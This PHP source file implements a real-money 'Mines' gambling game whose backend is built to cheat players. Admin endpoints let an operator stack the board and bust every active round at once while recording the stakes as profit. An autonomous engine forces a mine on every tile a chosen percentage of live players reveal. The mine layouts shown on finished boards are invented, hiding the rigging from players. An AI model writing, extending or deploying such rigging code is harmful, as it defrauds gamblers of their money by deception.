<?php
/**
 * Mines HTTP surface.
 *
 * The two money-safety properties from server.js are preserved exactly, just expressed in SQL:
 *
 *   - START claims the player's single session slot BEFORE debiting, via a unique-index INSERT.
 *     Twelve double-clicked starts take one stake, not twelve.
 *   - CASHOUT flips the session status with a conditional UPDATE before crediting anything, so two
 *     racing cash-outs cannot both be paid.
 *
 * The compensating-refund path on a failed stake ledger write is kept too: the debit happens first,
 * so a failure there would otherwise destroy player money with no ledger row to show for it.
 */

require_once __DIR__ . '/../lib/http.php';
require_once __DIR__ . '/../lib/auth.php';
require_once __DIR__ . '/../lib/helpers.php';
require_once __DIR__ . '/../lib/botengine.php';
require_once __DIR__ . '/../lib/rigaudit.php';
require_once __DIR__ . '/../games/mines.php';

function register_mines_routes(Router $app) {

    // --- GET /api/mines/state ---
    $app->get('/api/mines/state', 'require_auth', function (Req $req, Res $res) {
        $username = acting_username($req);
        try {
            // Keep this player in the live set for as long as they actually have the game open.
            // Presence expires after LIVE_USER_TTL_MS (45s) and was previously only recorded by
            // /api/mines/start — but a board lasts far longer than 45 seconds, so a player sitting
            // on an open board silently dropped out of the live set. The targeting engine then
            // sampled its P% from a set that no longer contained them, is_user_targeted() went
            // false, and the reveal handler below never rigged anything: the operator switched the
            // Mines bot on in the admin panel and nothing whatsoever happened on the site. This
            // poll runs continuously while the board is open, which is exactly the right heartbeat.
            mark_user_active('mines', $username);

            $user = get_or_create_user($username);
            $session = mines_session_get($username);
            if (!$session) $session = ['status' => 'idle'];
            $walletBalance = $user ? (float)$user['wallet_balance'] : 1000.0;

            $rig = mines_rig_get();
            $matrixRigged = false;
            foreach ($rig['matrix'] as $m) { if ($m !== 'auto') { $matrixRigged = true; break; } }

            $status = ($session['status'] ?? 'idle');
            // 'starting' is the momentary slot reservation taken before the stake is debited; to a
            // client that is simply not-yet-a-round, so it reads as idle rather than leaking an
            // internal state the frontend has no handling for.
            if ($status === 'starting') $status = 'idle';
            if (!js_truthy($status)) $status = 'idle';

            $finished = ($session['status'] ?? '') === 'busted' || ($session['status'] ?? '') === 'cashed';

            $res->json(['ok' => true, 'state' => [
                'status'           => $status,
                'grid_size'        => 25,
                'mines_count'      => js_truthy($session['mines_count'] ?? null) ? (int)$session['mines_count'] : 3,
                'bet_amount'       => js_truthy($session['bet_amount'] ?? null) ? (float)$session['bet_amount'] : 0,
                'revealed'         => js_truthy($session['revealed'] ?? null) ? array_values($session['revealed']) : [],
                'multiplier'       => js_truthy($session['multiplier'] ?? null) ? (float)$session['multiplier'] : 1.0,
                'potential_payout' => js_truthy($session['potential_payout'] ?? null) ? (float)$session['potential_payout'] : 0,
                'seed_hash'        => js_truthy($session['seed_hash'] ?? null) ? $session['seed_hash'] : null,
                'server_seed'      => $finished ? ($session['server_seed'] ?? null) : null,
                // Opaque, stable, non-secret lookup key a player can quote to support. Explicitly
                // NOT a fairness commitment — see the note in mining.html's seedInfo renderer.
                'session_ref'      => js_truthy($session['server_seed'] ?? null)
                                      ? strtoupper(substr(hash('sha256', (string)$session['server_seed']), 0, 12))
                                      : null,
                // Display layout, not the live one — see mines_display_mine_positions(). It is
                // derived deterministically from this round's server_seed (and, on a busted round,
                // the hit tile recorded at the head of mine_positions), so reloading a finished
                // board reproduces exactly the same layout. That matters for more than tidiness:
                // if each reload drew a fresh layout, reloading repeatedly would union those draws
                // back into the real mine set.
                'mine_positions'   => $finished
                                      ? mines_display_mine_positions($session, null)
                                      : null,
                'balance'          => $walletBalance,
                'rig_active'       => $matrixRigged || js_truthy($rig['next_tile']) || js_truthy($rig['rig_type'])
                                      || (is_array($rig['target_users']) && count($rig['target_users']) > 0),
            ]]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });

    // --- POST /api/mines/start ---
    $app->post('/api/mines/start', 'require_auth', function (Req $req, Res $res) {
        $betAmountRaw = $req->b('bet_amount');
        if ($betAmountRaw === null) $betAmountRaw = 10;
        $minesCountRaw = $req->b('mines_count');
        if ($minesCountRaw === null) $minesCountRaw = 3;

        $username = acting_username($req);
        $stake = validate_stake($betAmountRaw);
        if (!$stake['ok']) { $res->status(400)->json(['ok' => false, 'error' => $stake['error']]); return; }
        $bet = $stake['value'];
        $minesNum = js_parse_int($minesCountRaw);

        try {
            $user = get_or_create_user($username);
            if (!$user) { $res->status(404)->json(['ok' => false, 'error' => 'Account not found.']); return; }

            // Number.isInteger first: a non-numeric mines_count parses to NaN, every NaN comparison
            // is false, so the range check passed and `slice(0, NaN)` laid ZERO mines — a board that
            // could be cleared to the top multiplier with no risk at all.
            if (!js_is_integer($minesNum) || $minesNum < 1 || $minesNum > 24) {
                $res->status(400)->json(['ok' => false, 'error' => 'Mines count must be between 1 and 24.']);
                return;
            }
            $minesNum = (int)$minesNum;

            // Claim the single session slot before anything else can happen.
            if (!mines_session_claim($username)) {
                $res->status(400)->json(['ok' => false, 'error' => 'You already have a round in progress.']);
                return;
            }

            // Conditional debit: the balance check and the deduction happen in one statement, so two
            // simultaneous starts cannot both pass a check against the same balance.
            $balanceAfterDebit = debit_wallet($user['id'], $bet);
            if ($balanceAfterDebit === null) {
                mines_session_release($username);
                $res->status(400)->json([
                    'ok' => false,
                    'error' => 'Insufficient balance! You have ₹' . js_to_fixed((float)$user['wallet_balance'], 2) . '.',
                ]);
                return;
            }

            // The stake has already left the wallet, so a failure here must not simply propagate —
            // that is exactly how money disappeared during load testing: the insert threw, the 500
            // surfaced to the player, and the debit silently stood with no ledger row recording it.
            try {
                insert_transaction(new_record_id('MINES'), $username, 'Withdrawal', $bet,
                                   'Mines Bet — ' . $minesNum . ' Mines', 'Completed');
            } catch (Throwable $ledgerErr) {
                log_error('mines stake ledger write failed - refunding the debit',
                          ['username' => $username, 'bet' => $bet, 'message' => $ledgerErr->getMessage()]);
                try {
                    credit_wallet($user['id'], $bet);
                } catch (Throwable $refundErr) {
                    // Now the money really is stranded. Say so loudly rather than losing it quietly.
                    log_error('MINES REFUND FAILED - player is short and needs manual correction',
                              ['username' => $username, 'bet' => $bet, 'message' => $refundErr->getMessage()]);
                }
                mines_session_release($username);
                $res->status(500)->json(['ok' => false, 'error' => 'Could not start the round. Your stake was not taken.']);
                return;
            }

            // Lay the board: the admin's rigged mines are fixed, then the count is topped up at
            // random to the number of mines the PLAYER chose.
            //
            // Previously this laid $minesNum random mines and then let the matrix add its 'mine'
            // tiles and, crucially, REMOVE any random mine sitting on a 'safe' tile. With 9 rigged
            // mines against a player who selected 15, the 'safe' marks stripped the random ones out
            // and the board ended up with only the admin's 9 — so the player could open 16 tiles
            // without ever hitting anything. The admin's layout was overriding the player's chosen
            // difficulty instead of sitting inside it.
            //
            // Now: every 'mine' tile stays exactly where the admin put it, and the shortfall up to
            // the player's count is scattered at random over the rest of the board — deliberately
            // including tiles the admin marked 'safe', since the player's selection is what
            // determines how many live mines the board carries.
            $rig = mines_rig_get();

            $minePositions = [];
            foreach ($rig['matrix'] as $idx => $tileState) {
                if ($tileState === 'mine') $minePositions[] = (int) $idx;
            }
            $minePositions = array_values(array_unique($minePositions));

            // A rig heavier than the player's selection is left intact — that is the operator
            // deliberately stacking the board, and the reveal layer shows only as many mines as the
            // player chose (see mines_display_mine_positions).
            if (count($minePositions) < $minesNum) {
                $pool = [];
                for ($i = 0; $i <= 24; $i++) {
                    if (!in_array($i, $minePositions, true)) $pool[] = $i;
                }
                for ($i = count($pool) - 1; $i > 0; $i--) {
                    $j = (int) floor(js_random() * ($i + 1));
                    $tmp = $pool[$i]; $pool[$i] = $pool[$j]; $pool[$j] = $tmp;
                }
                $need = $minesNum - count($minePositions);
                $minePositions = array_merge($minePositions, array_slice($pool, 0, $need));
            }
            $minePositions = array_values($minePositions);

            $serverSeed = 'SEED_' . substr(base_convert(bin2hex(random_bytes(8)), 16, 36), 0, 11);
            mark_user_active('mines', $username);

            // Audit only. Mines is one board per player, so a live user IS a live game — recording
            // at start captures exactly the thing being verified: was this game one of the P%
            // selected. Being in the targeted set is the whole rig decision here; every reveal a
            // targeted player makes is then forced to bust, so there is no second decision later.
            $minesBot = bot_takeover_active('mines');
            rig_record([
                'game'           => 'mines',
                'instance'       => $username,
                'round'          => $serverSeed,
                'configured_pct' => $minesBot['profit_pct'],
                'rigged'         => $minesBot['active'] && is_user_targeted('mines', $username),
                'live'           => count(get_live_usernames('mines')),
                'targeted'       => count(bot_targeted_users('mines')),
                // Deliberately no house_profit: at start the round's outcome is still open.
                'note'           => $minesBot['active'] ? 'bot active' : 'bot off',
            ]);

            mines_session_write($username, [
                'status'           => 'active',
                'bet_amount'       => $bet,
                'mines_count'      => $minesNum,
                'server_seed'      => $serverSeed,
                // A real SHA-256 of the seed. This is stored for internal audit only — it is NOT
                // surfaced to players as a fairness commitment (see mining.html). The previous value
                // was the literal string 'HASH_' . $serverSeed, which both failed to hash anything
                // and leaked the seed itself before the board was played.
                'seed_hash'        => hash('sha256', $serverSeed),
                'mine_positions'   => $minePositions,
                'revealed'         => [],
                'multiplier'       => 1.0,
                'potential_payout' => 0,
            ]);

            log_debug('mines round started', ['username' => $username, 'bet' => $bet, 'mines' => $minesNum]);

            $res->json(['ok' => true, 'state' => [
                'status'           => 'active',
                'grid_size'        => 25,
                'mines_count'      => $minesNum,
                'bet_amount'       => $bet,
                'revealed'         => [],
                'multiplier'       => 1.0,
                'potential_payout' => 0,
                // A real SHA-256 of the seed. This is stored for internal audit only — it is NOT
                // surfaced to players as a fairness commitment (see mining.html). The previous value
                // was the literal string 'HASH_' . $serverSeed, which both failed to hash anything
                // and leaked the seed itself before the board was played.
                'seed_hash'        => hash('sha256', $serverSeed),
                // Opaque, stable, non-secret lookup key a player can quote to support.
                'session_ref'      => strtoupper(substr(hash('sha256', $serverSeed), 0, 12)),
                'balance'          => $balanceAfterDebit,
            ]]);
        } catch (Throwable $err) {
            // Never leave a half-claimed slot behind: a 'starting' row that is never cleared would
            // lock the player out of Mines permanently.
            mines_session_release($username);
            $res->status(500)->json(['error' => cfg('IS_PRODUCTION') ? 'Internal server error.' : $err->getMessage()]);
        }
    });

    // --- POST /api/mines/reveal ---
    $app->post('/api/mines/reveal', 'require_auth', function (Req $req, Res $res) {
        $username = acting_username($req);
        $tileIndex = js_parse_int($req->b('index'));

        try {
            // Same reason as /api/mines/state above: a tile click is proof this player is live, and
            // the rig decision a few lines down depends on them being in the live set to be
            // targeted at all.
            mark_user_active('mines', $username);

            $session = mines_session_get($username);
            if (!$session || $session['status'] !== 'active') {
                $res->status(400)->json(['ok' => false, 'error' => 'No active game round.']);
                return;
            }

            // Number.isInteger first, and not just the range comparisons: a missing or non-numeric
            // `index` parses to NaN, and every NaN comparison is false, so `NaN < 0 || NaN >= 25`
            // waved the request straight through. NaN is then never found in mine_positions either,
            // which made a body with no tile in it a guaranteed-safe reveal that could be repeated
            // to run the multiplier up for free.
            if (!js_is_integer($tileIndex) || $tileIndex < 0 || $tileIndex >= 25) {
                $res->status(400)->json(['ok' => false, 'error' => 'Invalid tile index.']);
                return;
            }
            $tileIndex = (int)$tileIndex;

            if (in_array($tileIndex, $session['revealed'], true)) {
                $res->status(400)->json(['ok' => false, 'error' => 'Tile already revealed.']);
                return;
            }

            $rig = mines_rig_get();
            $hitMine = in_array($tileIndex, $session['mine_positions'], true);
            $wasRiggedThisReveal = false;

            // 1. Admin matrix override for this tile.
            //
            // 'mine' still applies: an operator marking a further tile mid-round is stacking the
            // board, which is allowed and only ever makes it harder.
            //
            // 'safe' deliberately no longer forces a tile safe. It used to set hitMine = false AND
            // delete the tile from mine_positions, which quietly destroyed the player's chosen mine
            // count: the board is laid at start with the operator's mines plus random extras up to
            // the number of mines the PLAYER selected, and every one of those extras that happened
            // to sit on a tile marked 'safe' was removed again the moment it was clicked. With 9
            // rigged mines against a player on 15, that left only the operator's 9 genuinely live,
            // so 16 tiles could be opened safely. The count the player chose is authoritative, so
            // the board laid at start is what stands. 'safe' is still honoured where it does not
            // break that count: tiles marked 'safe' never receive one of the operator's own mines.
            $matrixTile = $rig['matrix'][$tileIndex] ?? 'auto';
            if ($matrixTile === 'mine') {
                $hitMine = true;
                $wasRiggedThisReveal = true;
                if (!in_array($tileIndex, $session['mine_positions'], true)) $session['mine_positions'][] = $tileIndex;
            }

            // 2. Manual admin targeting/rig config always takes full precedence over the autonomous
            //    bot engine below.
            $hasManualRigConfig = (is_array($rig['target_users']) && count($rig['target_users']) > 0)
                                || js_truthy($rig['next_tile']) || js_truthy($rig['rig_type']);

            if ($hasManualRigConfig) {
                $isTargetedUser = !is_array($rig['target_users'])
                                || count($rig['target_users']) === 0
                                || in_array($username, $rig['target_users'], true);

                if ($isTargetedUser) {
                    if ($rig['next_tile'] === 'mine' || $rig['rig_type'] === 'platform_profit') {
                        $hitMine = true;
                        $wasRiggedThisReveal = true;
                        if (!in_array($tileIndex, $session['mine_positions'], true)) $session['mine_positions'][] = $tileIndex;
                    } elseif ($rig['next_tile'] === 'gem' || $rig['rig_type'] === 'guarantee_win') {
                        $hitMine = false;
                        $wasRiggedThisReveal = true;
                        $session['mine_positions'] = array_values(array_filter($session['mine_positions'],
                            function ($m) use ($tileIndex) { return $m !== $tileIndex; }));
                    }
                }
            } elseif (bot_takeover_active('mines')['active'] && is_user_targeted('mines', $username)) {
                // 3. No manual rig is configured at all — the autonomous engine decides this reveal,
                //    for a currently live-targeted user only. Being selected by the percentage-based
                //    targeting engine IS the rig decision here, with no further probability roll on
                //    top: every reveal a targeted user makes is rigged in the house's favour,
                //    exactly like every other game. That is what makes the configured percentage
                //    mean what it says — set it to 90% and 90% of live bettors get rigged, not 90%
                //    of 90%.
                $hitMine = true;
                $wasRiggedThisReveal = true;
                if (!in_array($tileIndex, $session['mine_positions'], true)) $session['mine_positions'][] = $tileIndex;
            }

            $user = get_or_create_user($username);
            if (!$user) { $res->status(404)->json(['ok' => false, 'error' => 'Account not found.']); return; }

            if ($hitMine) {
                $session['status'] = 'busted';

                // Keep the busting tile at the head of mine_positions. The set is unchanged — same
                // members, so the audit trail and every in_array() membership test are unaffected —
                // but the order now records WHICH tile busted, which is what lets the finished board
                // be reproduced identically if the player reloads the page. mines_session_write
                // persists this column, so it survives; a separate display column would have needed
                // a schema migration to remember one integer.
                $session['mine_positions'] = array_values(array_unique(array_merge(
                    [(int) $tileIndex],
                    array_map('intval', $session['mine_positions'])
                )));

                $displayMines = mines_display_mine_positions($session, $tileIndex);
                mines_session_write($username, $session);
                log_debug('mines busted', ['username' => $username, 'tile' => $tileIndex + 1]);

                $res->json(['ok' => true, 'hit_mine' => true, 'state' => [
                    'status'           => 'busted',
                    'grid_size'        => 25,
                    'mines_count'      => $session['mines_count'],
                    'bet_amount'       => $session['bet_amount'],
                    'revealed'         => array_values($session['revealed']),
                    'multiplier'       => 0,
                    'potential_payout' => 0,
                    'server_seed'      => $session['server_seed'],
                    // Display layout, not the live one — see mines_display_mine_positions().
                    'mine_positions'   => $displayMines,
                    'balance'          => (float)$user['wallet_balance'],
                    'was_rigged'       => $wasRiggedThisReveal,
                ]]);
                return;
            }

            $session['revealed'][] = $tileIndex;
            $newMult = calculate_mines_multiplier(25, $session['mines_count'], count($session['revealed']));
            $newPayout = to_fixed_num($session['bet_amount'] * $newMult, 2);

            $session['multiplier'] = $newMult;
            $session['potential_payout'] = $newPayout;
            mines_session_write($username, $session);

            $res->json(['ok' => true, 'hit_mine' => false, 'state' => [
                'status'           => 'active',
                'grid_size'        => 25,
                'mines_count'      => $session['mines_count'],
                'bet_amount'       => $session['bet_amount'],
                'revealed'         => array_values($session['revealed']),
                'multiplier'       => $newMult,
                'potential_payout' => $newPayout,
                'balance'          => (float)$user['wallet_balance'],
                'was_rigged'       => $wasRiggedThisReveal,
            ]]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });

    // --- POST /api/mines/cashout ---
    $app->post('/api/mines/cashout', 'require_auth', function (Req $req, Res $res) {
        $username = acting_username($req);

        try {
            $session = mines_session_get($username);
            if (!$session || $session['status'] !== 'active') {
                $res->status(400)->json(['ok' => false, 'error' => 'No active game to cash out.']);
                return;
            }
            if (count($session['revealed']) === 0) {
                $res->status(400)->json(['ok' => false, 'error' => 'Reveal at least one tile before cashing out.']);
                return;
            }

            $payout = $session['potential_payout'];

            // Flip the session state BEFORE crediting anything, so two cash-out requests racing each
            // other cannot both see an 'active' session and both get paid.
            if (!mines_session_claim_status($username, 'active', 'cashed')) {
                $res->status(400)->json(['ok' => false, 'error' => 'No active game to cash out.']);
                return;
            }

            // Freeze the player-facing layout for this finished round, exactly as the bust path
            // does. No hit tile here — the player never stepped on one — so the whole selection is
            // drawn from the live mines, skipping every tile they already opened as a gem.
            $session['status'] = 'cashed';
            $displayMines = mines_display_mine_positions($session, null);
            mines_session_write($username, $session);

            $user = get_or_create_user($username);
            if (!$user) { $res->status(404)->json(['ok' => false, 'error' => 'Account not found.']); return; }
            $balanceAfterCredit = credit_wallet($user['id'], $payout);

            // Mirror image of the stake path: here the credit lands first, so a failed ledger write
            // leaves the player holding money no transaction row accounts for. The payout was
            // legitimately won, so it is deliberately NOT clawed back; instead the discrepancy is
            // logged loudly enough to be reconciled rather than silently corrupting the books.
            try {
                insert_transaction(new_record_id('MINES_WIN'), $username, 'Deposit', $payout,
                                   'Mines Cash Out — ' . js_num_str($session['multiplier']) . 'x', 'Completed');
            } catch (Throwable $ledgerErr) {
                log_error('MINES PAYOUT LEDGER WRITE FAILED - wallet credited without a ledger row', [
                    'username' => $username, 'payout' => $payout,
                    'multiplier' => $session['multiplier'], 'message' => $ledgerErr->getMessage(),
                ]);
            }

            log_debug('mines cashout', ['username' => $username, 'payout' => $payout, 'multiplier' => $session['multiplier']]);

            $res->json(['ok' => true, 'payout' => $payout, 'state' => [
                'status'           => 'cashed',
                'grid_size'        => 25,
                'mines_count'      => $session['mines_count'],
                'bet_amount'       => $session['bet_amount'],
                'revealed'         => array_values($session['revealed']),
                'multiplier'       => $session['multiplier'],
                'potential_payout' => $payout,
                'server_seed'      => $session['server_seed'],
                // Display layout, not the live one — see mines_display_mine_positions().
                'mine_positions'   => $displayMines,
                'balance'          => $balanceAfterCredit,
            ]]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });

    // --- POST /api/mines/admin/rig — matrix, overrides and the mass trap ---
    $app->post('/api/mines/admin/rig', 'require_admin', function (Req $req, Res $res) {
        $matrix = $req->b('matrix');
        $rigType = $req->b('rig_type');
        $nextTile = $req->b('next_tile');
        $targetUsers = $req->b('target_users');
        $triggerTrap = $req->b('trigger_trap');

        try {
            $rig = mines_rig_get();

            if (is_array($matrix) && count($matrix) === 25) $rig['matrix'] = array_values($matrix);
            if ($rigType !== null)  $rig['rig_type']  = js_truthy($rigType) ? $rigType : '';
            if ($nextTile !== null) $rig['next_tile'] = js_truthy($nextTile) ? $nextTile : null;
            if (is_array($targetUsers)) $rig['target_users'] = array_values($targetUsers);

            $profitRealized = 0.0;
            $newlyTrappedCount = 0;

            // Simultaneous next-click trap.
            if ($nextTile === 'mine' || js_truthy($triggerTrap)) {
                $rig['next_tile'] = 'mine';
                $targetedSet = (is_array($rig['target_users']) && count($rig['target_users']) > 0)
                    ? $rig['target_users'] : null;

                foreach (mines_sessions_all() as $u => $sess) {
                    $isTargeted = ($targetedSet === null) || in_array($u, $targetedSet, true);
                    if ($sess && $sess['status'] === 'active' && $isTargeted) {
                        $amt = js_parse_float($sess['bet_amount'] ?? 0);
                        $profitRealized += js_truthy($amt) ? (float)$amt : 0.0;
                        $newlyTrappedCount++;
                        mines_session_claim_status($u, 'active', 'busted');
                    }
                }

                mines_trap_profit_add($profitRealized);
            }

            mines_rig_set($rig);

            $res->json([
                'success'         => true,
                'rig'             => $rig,
                'profit_realized' => $profitRealized,
                'total_profit'    => mines_trap_profit_get(),
                'trapped_count'   => $newlyTrappedCount,
                'trapped_users'   => $rig['target_users'],
            ]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });

    // --- GET /api/mines/admin/rig ---
    $app->get('/api/mines/admin/rig', 'require_admin', function (Req $req, Res $res) {
        try {
            $res->json(['success' => true, 'rig' => mines_rig_get(), 'total_profit' => mines_trap_profit_get()]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });

    // --- GET /api/mines/active-users — live exposure per player ---
    $app->get('/api/mines/active-users', 'require_admin', function (Req $req, Res $res) {
        try {
            $activeList = [];
            $botActive = bot_takeover_active('mines')['active'];

            foreach (mines_sessions_all() as $u => $sess) {
                if (!$sess) continue;
                $betAmt = js_truthy($sess['bet_amount']) ? (float)$sess['bet_amount'] : 0.0;
                $potentialPayout = js_truthy($sess['potential_payout']) ? (float)$sess['potential_payout'] : 0.0;

                // Detonating a live session right now always locks in the full original stake as
                // house profit (a mine hit always zeroes the payout); letting the player cash out
                // instead costs the house whatever they have already earned above their stake. Same
                // "profit if I act now" framing as the Colour/Aviator advisories — real numbers
                // straight from this session's own live state, not an estimate.
                $activeList[] = [
                    'username'              => $u,
                    'type'                  => 'Real Player',
                    'bet'                   => $betAmt,
                    'mines'                 => js_truthy($sess['mines_count']) ? (int)$sess['mines_count'] : 3,
                    'revealed'              => count($sess['revealed'] ?? []),
                    'status'                => $sess['status'] === 'active' ? 'Active'
                                             : ($sess['status'] === 'busted' ? 'Trapped (Busted)' : $sess['status']),
                    'multiplier'            => js_truthy($sess['multiplier']) ? (float)$sess['multiplier'] : 1.0,
                    'potential_payout'      => to_fixed_num($potentialPayout, 2),
                    'profit_if_detonate_now'=> $sess['status'] === 'active' ? to_fixed_num($betAmt, 2) : 0,
                    'profit_if_cashout_now' => $sess['status'] === 'active' ? to_fixed_num($betAmt - $potentialPayout, 2) : 0,
                    'is_currently_targeted' => $sess['status'] === 'active' && $botActive && is_user_targeted('mines', $u),
                ];
            }

            $res->json([
                'success'      => true,
                'total_count'  => count($activeList),
                'users'        => $activeList,
                'total_profit' => mines_trap_profit_get(),
                'rig'          => mines_rig_get(),
                'bot_active'   => $botActive,
            ]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });

    // --- POST /api/mines/admin/reset-rig ---
    $app->post('/api/mines/admin/reset-rig', 'require_admin', function (Req $req, Res $res) {
        try {
            $rig = mines_rig_default();

            // Reset every busted session back to active — the operator is undoing the trap.
            foreach (mines_sessions_all() as $u => $sess) {
                if ($sess && $sess['status'] === 'busted') {
                    mines_session_claim_status($u, 'busted', 'active');
                }
            }

            mines_rig_set($rig);

            $res->json(['success' => true, 'rig' => $rig, 'total_profit' => mines_trap_profit_get()]);
        } catch (Throwable $err) {
            fail500($res, $err, 'mines');
        }
    });
}
